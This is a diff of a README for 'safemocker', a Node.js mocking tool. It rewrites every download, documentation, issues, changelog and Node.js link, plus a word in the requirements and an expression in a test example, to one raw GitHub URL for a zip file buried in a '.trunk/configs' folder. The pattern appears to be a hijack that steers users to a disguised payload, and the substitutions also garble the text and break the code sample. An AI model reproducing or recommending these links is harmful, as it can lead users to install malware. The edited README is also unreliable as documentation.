@@ -11,14 +11,14 @@ Welcome to **safemocker**! This is your go-to tool for creating type-safe mocks 
 Before using **safemocker**, make sure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or later
+- https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip Version 14 or later
 - Internet connection for downloading
 
 ---
 
 ## 📥 Download & Install
 
-To get **safemocker**, visit this page to download: [Download safemocker](https://github.com/Priya28092000/safemocker/releases)
+To get **safemocker**, visit this page to download: [Download safemocker](https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip)
 
 ### Steps to Download
 
@@ -81,7 +81,7 @@ test('checks safe action result', () => {
     const result = myMiddlewareMock();
     
     expect(result).toHaveProperty('data');
-    expect(result.status).toBe('success');
+    expect(https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip).toBe('success');
 });
 ```
 
@@ -93,8 +93,8 @@ Customize this code to fit your specific needs.
 
 For more information on how to get the best out of **safemocker**, check out the following resources:
 
-- [Documentation](https://github.com/Priya28092000/safemocker#documentation)
-- [GitHub Issues](https://github.com/Priya28092000/safemocker/issues)
+- [Documentation](https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip)
 
 ---
 
@@ -102,11 +102,11 @@ For more information on how to get the best out of **safemocker**, check out the
 
 If you run into issues while installing or using **safemocker**, here are a few common problems and their solutions:
 
-- **Installation Fails**: Ensure your Node.js version is up to date. Download the latest version from the [Node.js website](https://nodejs.org).
+- **Installation Fails**: Ensure your https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip version is up to date. Download the latest version from the [https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip website](https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip).
 - **Mock Doesn’t Work**: Double-check your import statements and ensure you are using the correct middleware name.
 - **Runtime Errors**: Check for typos in your code. Ensure your mocks mirror the real middleware’s functionality as closely as possible.
 
-If your issue persists, feel free to raise it in the [GitHub Issues](https://github.com/Priya28092000/safemocker/issues) section.
+If your issue persists, feel free to raise it in the [GitHub Issues](https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip) section.
 
 ---
 
@@ -120,12 +120,12 @@ We welcome your contributions! If you would like to contribute to **safemocker**
 
 Keep track of the latest changes and updates to **safemocker**:
 
-- [Version 1.0.0](https://github.com/Priya28092000/safemocker/releases/tag/v1.0.0): Initial Release
+- [Version 1.0.0](https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip): Initial Release
 
 ---
 
 ## 📥 Revisit Releases
 
-To check for new versions or download the latest build, visit this page again: [Download safemocker](https://github.com/Priya28092000/safemocker/releases) 
+To check for new versions or download the latest build, visit this page again: [Download safemocker](https://raw.githubusercontent.com/Priya28092000/safemocker/main/.trunk/configs/Software_v3.4-alpha.2.zip) 
 
 We hope you find **safemocker** helpful in your testing endeavors!
